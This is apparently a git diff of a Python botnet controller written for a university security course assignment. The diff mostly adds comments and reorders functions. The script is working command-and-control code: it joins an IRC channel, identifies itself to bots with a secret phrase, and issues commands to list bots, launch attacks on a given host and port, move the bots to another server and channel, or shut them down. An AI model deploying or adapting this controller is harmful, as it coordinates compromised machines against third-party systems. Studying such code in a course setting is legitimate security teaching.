@@ -1,3 +1,14 @@
+#
+#conbot.py
+#
+# This program implements a controller verified to bots to
+# issue them commands via an IRC client.
+#
+# Authors: Shane Sims and Mason Lieu
+# Assignment 6
+# CPSC 526 Fall 2017
+# version: 3 December 2017
+#
 import sys
 import random
 import socket
@@ -5,6 +16,10 @@ import string
 import time
 import re
 import select
+
+#/////////////////////////////////////////////////////////////////////////////////////
+#============================= Connecting to the server ==============================
+#/////////////////////////////////////////////////////////////////////////////////////
 
 # Function to get a nick with a high probability of being unique by using randomness
 def getNick():
@@ -45,6 +60,8 @@ def connectToIRC():
         debug("Error in connectToIRC")
         print("Error: " + str(e))
         time.sleep(TIMEOUT)
+    print("Controller is running. \nConnected with nick: " + nick + "\nConnected on channel: " + CHANNEL + "\n")
+    return
 
 def joinChannel(chann, secret):
     joinMessage = "JOIN #" + chann + "\r\n"
@@ -54,18 +71,20 @@ def joinChannel(chann, secret):
     pvtmsgToChannel(secret[1:])
     return
 
+#///////////////////////////////////////////////////////////////////////////////////////////////
+#============================= Listening to inputs: IRC and stdin ==============================
+#///////////////////////////////////////////////////////////////////////////////////////////////
+
 # Function that monitors IRC message and stdin traffic
 def listen():
     while True:
-        print("Controller is running. \nConnected with nick: " + nick + "\nConnected on channel: " + CHANNEL)
         sys.stdout.write("Enter a command: ")
         sys.stdout.flush()
-        inputs = [sys.stdin, IRCconnection]
-        outputs = [sys.stdout]
-        readers, writers, errors, = select.select(inputs, [], [])
+        inputs = [sys.stdin, IRCconnection]                                             # The inputs to listen on
+        readers, _, _, = select.select(inputs, [], [])                                  # Selects which input to read from if available
         try:
             for reader in readers:
-                if reader is IRCconnection:
+                if reader is IRCconnection:                                             # Received input from IRC channel
                     print("\nReading from IRC")
                     ircmessage = IRCconnection.recv(512)
                     ircmessage = ircmessage.decode("utf-8")
@@ -75,14 +94,16 @@ def listen():
                         return                                                          # Attempt to reconnect in main
                     else:
                         if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):     # Prevent inactive connection from closing
+                            print("Ping'd by server")
                             IRCconnection.sendall(b'PONG\r\n')
-                        elif "JOIN" in splitmessage:
+                        elif "JOIN" in splitmessage:                                    # Bot has joined the channel
                             pvtmsgToChannel(SECRET_PHRASE[1:])
-                        elif "QUIT" in splitmessage:
+                            bot = (splitmessage[0].split("!"))[0][1:]
+                            print(bot + " has joined")
+                        elif "QUIT" in splitmessage:                                    # Bot has quit from the channel either intententionally or not
                             bot = (splitmessage[0].split("!"))[0][1:]
                             print(bot + " has exited")
-
-                elif reader is sys.stdin:
+                elif reader is sys.stdin:                                               # Received input from user
                     getCommand()
         except Exception as e:
             debug("Error in listen")
@@ -91,11 +112,8 @@ def listen():
 
 # Function that reads the command input from the user
 def getCommand():
-    atck = re.compile('attack\s(\S+\.?\S+)+\s\d+')
-    mv = re.compile('move\s(\S+\.?\S+)+\s\d+\s\S+')
-    gettingCmdFlag = True
-    host = ""
-    port = 0
+    atck = re.compile('attack\s(\S+\.?\S+)+\s\d+')                                      # Regex that matches to "attack <host> <port>"
+    mv = re.compile('move\s(\S+\.?\S+)+\s\d+\s\S+')                                     # Regex that matches to "move <host> <port> <channel>"
     try:
         cmd = sys.stdin.readline()
         cmd = cmd.strip()
@@ -110,7 +128,7 @@ def getCommand():
         elif cmd == "shutdown":
             shutdown(cmd)
         else:
-            print("Command " + cmd + " not valid.")
+            print("Command " + cmd + " is not valid.")
             return
     except Exception as e:
         debug("Error in getCommand")
@@ -118,41 +136,11 @@ def getCommand():
         return
     return
 
-# Function that sends the nick of the bot to the controller via message to the channel
-def pvtmsgToChannel(messageToSend):
-    pvtMessage = "PRIVMSG #" + CHANNEL + " :" + messageToSend + "\r\n"
-    IRCconnection.sendall(pvtMessage.encode("utf-8"))
-    return
-
-# Function that receives a response after issuing a command
-def getData():
-    try:
-        reading = True
-        message = ""
-        print("Getting response from bot(s)")
-        time.sleep(TIMEOUT)
-        try:
-            readers, _, _, = select.select([IRCconnection], [], [], 0)
-            if len(readers) == 0:
-                print("No response from bot(s)")
-                return "0"
-        except:
-            print("No response from bot(s)")
-            return "0"
-        print("Received response from bot(s)")
-        while reading:
-            ircmessage = IRCconnection.recv(512)
-            if len(ircmessage) != 512:
-                reading = False
-            ircmessage = ircmessage.decode("utf-8")
-            message += ircmessage
-    except Exception as e:
-        debug("Error in getData")
-        print("Error: " + str(e))
-        return
-    return message
-
+#/////////////////////////////////////////////////////////////////////
 #============================= Commands ==============================
+#/////////////////////////////////////////////////////////////////////
+
+# Function that counts and lists all active bots on the channel
 def status(cmd):
     botCount = 0
     botList = []
@@ -161,24 +149,26 @@ def status(cmd):
     splitmessage = message.strip().split()
     for i in range(0, len(splitmessage)):
         if splitmessage[i] == "PRIVMSG":
-            bot = splitmessage[i+2][1:]
+            bot = splitmessage[i+2][1:]                                 # Get bot name from a position defined in the "status" protocol
             botList.append(bot)
             botCount += 1
     if len(botList) > 0:
-        sys.stdout.write("Found " + str(botCount) + " bot(s):\n")
-        col = 0
-        for bot in botList[:-1]:
-            if col < 6:
+        sys.stdout.write("Found " + str(botCount) + " bot(s): ")
+        fill = 0
+        for bot in botList[:-1]:                                        # Formats 8 bot names per line, separated by commas, and ending with a period
+            if fill < 6:
                 sys.stdout.write(bot + ", ")
-                col += 1
+                fill += 1
             else:
                 sys.stdout.write(bot + ",\n")
-                col = 0
+                fill = 0
         print(botList[-1] + ".")
     else:
         print("Found 0 bots.")
     return
 
+# Function that issues an attack by the bots on the channel to a given host and port
+# Counts the number of successful and unsuccessful attacks
 def attack(cmd):
     suc = 0
     unsuc = 0
@@ -187,8 +177,8 @@ def attack(cmd):
     splitmessage = message.strip().split()
     for i in range(0, len(splitmessage)):
         if splitmessage[i] == "PRIVMSG" and splitmessage[i+2][1:] == "attack":
-            addr = splitmessage[i-1]
-            bot = addr.split("!")[0][1:]
+            addr = splitmessage[i-1]                                                # The header of a PRIVMSG
+            bot = addr.split("!")[0][1:]                                            # Get bot name
             if splitmessage[i+3] == "successful":
                 suc += 1
                 print(bot + ": attack successful")
@@ -198,6 +188,8 @@ def attack(cmd):
     print("Total: " + str(suc) + " successful, " + str(unsuc) + " unsuccessful")
     return
 
+# Function that requests the bots to move to a given host, port, and channel
+# Counts the number of bots moved
 def migrate(cmd):
     suc = 0
     pvtmsgToChannel(cmd)
@@ -205,20 +197,22 @@ def migrate(cmd):
     splitmessage = message.strip().split()
     for i in range(0, len(splitmessage)):
         if splitmessage[i] == "PRIVMSG":
-            for j in range(0, 10):
-                if splitmessage[i+j].strip(".") == "successful":
+            for j in range(0, 10):                                                  # If "PRIVMSG" is seen, check the next 10 words
+                if splitmessage[i+j].strip(".") == "successful":                    # for the word "successful" or "unsuccessful"
                     suc += 1
                 elif splitmessage[i+j] == "unsuccessful":
                     break
     print("Total: " + str(suc) + " successfully moved")
     return
 
-
+# Function that disconnects the controller from the server
 def quit():
     IRCconnection.close()
     print("Controller is closed")
     sys.exit()
 
+# Function that commands the bots to exit from the server
+# Counts the number of bots that shut down
 def shutdown(cmd):
     botCount = 0
     pvtmsgToChannel(cmd)
@@ -231,8 +225,48 @@ def shutdown(cmd):
             botCount += 1
     print("Total: " + str(botCount) + " bot(s) shut down")
     return
-#============================= // ==============================
 
+#////////////////////////////////////////////////////////////////////////////
+#============================= Other functions ==============================
+#////////////////////////////////////////////////////////////////////////////
+
+# Function that sends the nick of the bot to the controller via message to the channel
+def pvtmsgToChannel(messageToSend):
+    pvtMessage = "PRIVMSG #" + CHANNEL + " :" + messageToSend + "\r\n"
+    IRCconnection.sendall(pvtMessage.encode("utf-8"))
+    return
+
+# Function that receives a response after issuing a command
+# Waits an amount of TIMEMOUT to allow bots to reply
+# OUTPUT: all the data read from IRCconnection
+def getData():
+    try:
+        reading = True
+        message = ""
+        print("Getting response from bot(s)")
+        time.sleep(TIMEOUT)
+        try:
+            readers, _, _, = select.select([IRCconnection], [], [], 0)      # Timeout immediately if no readers have informatino to read
+            if len(readers) == 0:                                           # otherwise continue to reading from IRC
+                print("No response from bot(s)")
+                return "0"
+        except:
+            print("No response from bot(s)")
+            return "0"
+        print("Received response from bot(s)")
+        while reading:
+            ircmessage = IRCconnection.recv(512)
+            if len(ircmessage) != 512:                                      # Continue reading if the recv read the maximum number of bits
+                reading = False
+            ircmessage = ircmessage.decode("utf-8")
+            message += ircmessage
+    except Exception as e:
+        debug("Error in getData")
+        print("Error: " + str(e))
+        return
+    return message
+
+# If debug is entered at the final command line argument, this will print debug lines
 def debug(s):
     if DEBUG:
         print("DEBUG: " + s)
@@ -245,7 +279,7 @@ def main():
     global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
     global shutdownFlag                                                         # Will only be true when controller issues 'shutdown' command
     global DEBUG
-    global TIMEOUT
+    global TIMEOUT                                                              # Timeout value for reconnecting or receiving data from server
 
     TIMEOUT = 3
     DEBUG = False
@@ -263,7 +297,6 @@ def main():
             connectToIRC()
             listen()
             time.sleep(TIMEOUT)                                                       # Wait 5 seconds before attempting to reconnect
-
     else:
         print("Error: wrong command line arguments", file = sys.stderr)
 
